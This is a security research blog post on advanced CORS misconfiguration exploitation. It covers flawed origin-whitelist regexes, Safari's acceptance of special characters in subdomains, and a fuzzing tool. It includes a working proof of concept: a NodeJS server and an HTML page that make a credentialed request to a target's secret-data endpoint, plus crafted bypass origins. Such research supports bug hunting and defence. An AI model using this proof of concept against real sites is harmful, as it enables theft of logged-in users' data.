---
layout: post
title: "Advanced CORS Exploitation Techniques"
author: Corben Leo
---

### <font>preface:</font>
I've seen some fantastic research done by <a class="link" target='_blank' rel='noopener noreferrer' href='https://twitter.com/_zulln?lang=en'>Linus Särud</a> and by <a class="link" target='_blank' rel='noopener noreferrer' href='https://twitter.com/i_bo0om'>Bo0oM</a> on how Safari's handling of special characters could be abused. 

- <a target='_blank' rel='noopener noreferrer' href='https://labs.detectify.com/2018/04/04/host-headers-safari/'>https://labs.detectify.com/2018/04/04/host-headers-safari/</a>
<br><br>
- <a target='_blank' rel='noopener noreferrer' href='https://lab.wallarm.com/the-good-the-bad-and-the-ugly-of-safari-in-client-side-attacks-56d0cb61275a'>https://lab.wallarm.com/the-good-the-bad-and-the-ugly-of-safari-in-client-side-attacks-56d0cb61275a</a>

Both articles dive into practical scenarios where Safari's behavior can lead to XSS or Cookie Injection. The goal of this post is bring even more creativity and options to the table!

<br>

### introduction:

Last November, I <a href="/tricky-CORS/" class="link" target="_blank" rel="noopener noreferrer">wrote</a> about a tricky cross-origin resource sharing bypass in Yahoo View that abused Safari's handling of special characters. Since then, I've found more bugs using clever bypasses and decided to present more advanced techniques to be used.

<br>
<strong><u>Note</u>:</strong>

This assumes you have a basic understanding of what CORS is and how to exploit misconfigurations. Here are some awesome posts to get you caught up:<br>
- <a class="link" href="http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html"  target="_blank" rel="noopener noreferrer">Portswigger's Post</a><br>
- <a class="link" href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/"  target="_blank" rel="noopener noreferrer">Geekboy's post</a>

<br>
### background: dns & browsers:

**<u>Quick Summary:</u>**
- The <font class="link">Domain Name System</font> is essentially an address book for servers. It translates/maps hostnames to IP addresses, making the internet easier to use.
<br><br>
- When you attempt to visit a URL into a browser:<br> A DNS lookup is performed to convert the host to an IP address &#8702; it initiates a TCP connection to the server &#8702; the server responds with `SYN+ACK` &#8702; the browser sends an HTTP request to the server to retrieve content &#8702; then renders / displays the content accordingly.

If you're a visual thinker, <a target='_blank' class="link" rel='noopener noreferrer' href='https://archive.is/7esuD/7f605d268fe68f5c5e2490ecf520346ab24da23b.jpg'>here</a> is an image of the process.

DNS servers respond to arbitrary requests – you can send any characters in a subdomain and it'll respond as long as the domain has a wildcard DNS record.
<br>

**Example:**
```
dig A "<@$&(#+_\`^%~>.withgoogle.com" @1.1.1.1 | grep -A 1 "ANSWER SECTION"
```
![dig-result](/images/dig-result.png "Result of dig")

**Browsers?**

So we know DNS servers respond to these requests, but how do browsers handle them? 
_Answer:_ <b>Most</b> browsers validate domain names before making any requests. 

### examples:
**Chrome:**

![chrome](/images/browser-response/chrome.png "result")


**Firefox:**

![firefox](/images/browser-response/firefox.png "result")

<br>
**Safari:**

Notice how I said _most_ browsers validate domain names, not all of them do. Safari is the divergent: if we attempt to load the same domain, it will actually send the request and load the page:

![Safari](/images/browser-response/safari.png "result")


We can use all sorts of different characters, even unprintable ones: 
```
,&'";!$^*()+=`~-_=|{}%

// non printable chars
%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f
```
<br>
### jumping into cors configurations:
Most CORS integrations contain a whitelist of origins that are permitted to read information from an endpoint. This is usually done by using regular expressions.


**Example #1:**
```bash
^https?:\/\/(.*\.)?xxe\.sh$
```

**Intent:** The intent of implementing a configuration with this regex would be to allow cross-domain access from <special>xxe.sh</special> and <special>any subdomain</special> (http:// or https://)  

The only way an attacker would be able to steal data from this endpoint, is if they had either an XSS or subdomain takeover on `http(s)://xxe.sh` / `http(s)://*.xxe.sh`.

**Example #2:**
```bash
^https?:\/\/.*\.?xxe\.sh$
```

**Intent:**  Same as Example #1 – allow cross-domain access from xxe.sh and any subdomain

This regular expression is quite similar to the first example, however it contains a problem that would cause the configuration to be vulnerable to data theft.

The problem lies in the following regex: `.*\.?`

<b>Breakdown:</b>
```python
.* = any characters except for line terminators
\. = a period
?  = a quantifier, in this case matches "." either zero or one times.
```
Since `.*\.` is not in a capturing group (like in the first example), the `?` quantifier only affects the `.` character, therefore any characters are allowed before the string "<special>xxe.sh</special>", regardless of whether there is a period separating them. 

This means an attacker could send <b><i>any</i></b> origin ending in <special>xxe.sh</special> and would have cross-domain access. <br>

![Example2](/images/cors-example2.png "result")

This is a pretty common bypass technique – here's a real example of it:<br>
<a class="link" target='_blank' rel='noopener noreferrer' href='https://hackerone.com/reports/168574'>https://hackerone.com/reports/168574</a> by <a class="link" target='_blank' rel='noopener noreferrer' href='https://twitter.com/albinowax'>James Kettle</a> 

<br>
**Example #3:**
```bash
^https?:\/\/(.*\.)?xxe\.sh\:?.*
```
**Intent:** This would be likely be implemented with the intent to allow cross-domain access from <special>xxe.sh</special>, <special>all subdomains</special>, and from <special>any ports</special> on those domains.


Can you spot the problem?

<b>Breakdown:</b>
```python
\: = Matches the literal character ":"
?  = a quantifier, in this case matches ":" either zero or one times.
.* = any characters except for line terminators
```
<br>

Just like in the second example, the `?` quantifier only affects the `:` character. So if we send an origin with other characters after <special>xxe.sh</special>, it will still be accepted.
<br><br>
![Example3](/images/cors-example3.png "result")

<br>
### the million dollar question:
> How does Safari's handling of special characters come into play when exploiting CORS Misconfigurations?

Take the following Apache configuration for example:

```rb
SetEnvIf Origin "^https?:\/\/(.*\.)?xxe.sh([^\.\-a-zA-Z0-9]+.*)?" AccessControlAllowOrigin=$0
Header set Access-Control-Allow-Origin %{AccessControlAllowOrigin}e env=AccessControlAllowOrigin
```

This would be likely be implemented with the intent of cross-domain access from <special>xxe.sh</special>, <special>all subdomains</special>, and from <special>any ports</special> on those domains.

<br>
Here's a breakdown of the regular expression:
```python
[^\.\-a-zA-Z0-9] = does not match these characters: "." "-" "a-z" "A-Z" "0-9"
+  = a quantifier, matches above chars one or unlimited times (greedy)
.* = any character(s) except for line terminators
```
<br>

This API won't give access to domains like the ones in the previous examples and other common bypass techniques won't work. A subdomain takeover or an XSS on *.xxe.sh would allow an attacker to steal data, but let's get more creative!

We know any origin as *.xxe.sh followed by the characters `. - a-z A-Z 0-9` won't be trusted. What about an origin with a space after the string "xxe.sh"?


![Example3](/images/cors-space.png "result")

We see that it's trusted, however, such a domain <i>isn't</i> supported in any normal browser. <br><br>
Since the regex matches against alphanumeric ASCII characters and `. -`, special characters after "xxe.sh" would be trusted:

![Example3](/images/cors-special.png "result")

<br>
Such a domain would be supported in a modern, common browser: <special>Safari</special>.

## exploitation:

**Pre-Requisites:**
- A domain with a wildcard DNS record pointing it to your box.
- NodeJS

Like most browsers, Apache and Nginx (right out of the box) also don't like these special characters, so it's much easier to serve HTML and Javascript with NodeJS.

&#10007; <special>serve.js</special>
```javascript
var http = require('http');
var url  = require('url');
var fs   = require('fs');
var port = 80

http.createServer(function(req, res) {
    if (req.url == '/cors-poc') {
        fs.readFile('cors.html', function(err, data) {
            res.writeHead(200, {'Content-Type':'text/html'});
            res.write(data);
            res.end();
        });
    } else {
        res.writeHead(200, {'Content-Type':'text/html'});
        res.write('never gonna give you up...');
        res.end();
    }
}).listen(port, '0.0.0.0');
console.log(`Serving on port ${port}`);
```
<br>

In the same directory, save the following:

&#10007; <special>cors.html</special>
```html
<!DOCTYPE html>
<html>
<head><title>CORS</title></head>
<body onload="cors();">
<center>
cors proof-of-concept:<br><br>
<textarea rows="10" cols="60" id="pwnz">
</textarea><br>
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("pwnz").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", "http://x.xxe.sh/api/secret-data/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
```

Start the NodeJS server by running the following command:

```
node serve.js &
```

Like stated before, since the regular expression matches against alphanumeric ASCII characters and `. -`, special characters after "xxe.sh" would be trusted:

So if we open Safari and visit `http://x.xxe.sh{.<your-domain>/cors-poc`, we will see that we were able to successfully steal data from the vulnerable endpoint.


![Special](/images/cors-special1.png "result")

*Edit:* It was brought to my attention that the `_` character (in subdomains) is not only supported in Safari, but also in Chrome and Firefox! 
<br>Therefore `http://x.xxe.sh_.<your-domain>/cors-poc` would send valid origin from the most common browsers! Thanks <a class="link" href="https://twitter.com/1lastBr3ath"  target="_blank" rel="noopener noreferrer">Prakash</a>, you rock!


## practical testing
With these special characters now in mind, figuring out which Origins are reflected in the _Access-Control-Allow-Origin_ header can be a tedious, time-consuming task:
<br><br>

![Meme](/images/fuzz-meme.jpeg "Fuzz Meme")

### theftfuzzer:
To save time and to become more efficient, I decided to code a tool to fuzz CORS configurations for allowed origins. It's written in Python and it generates a bunch of different permutations for possible CORS bypasses. It can be found on my Github <a class="link" target='_blank' rel='noopener noreferrer' href='https://github.com/C0RB3N/theftfuzzer'>here</a>. If you have any ideas for improvements to the tool, feel free to ping me or make a pull request!
<br><br>

## outro
I hope this post has been informative and that you've learned from it! Go exploit those CORS configurations and earn some bounties &#128541;

<br>Happy Hunting!<br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/C0RB3N"  target="_blank" rel="noopener noreferrer">https://github.com/C0RB3N</a>
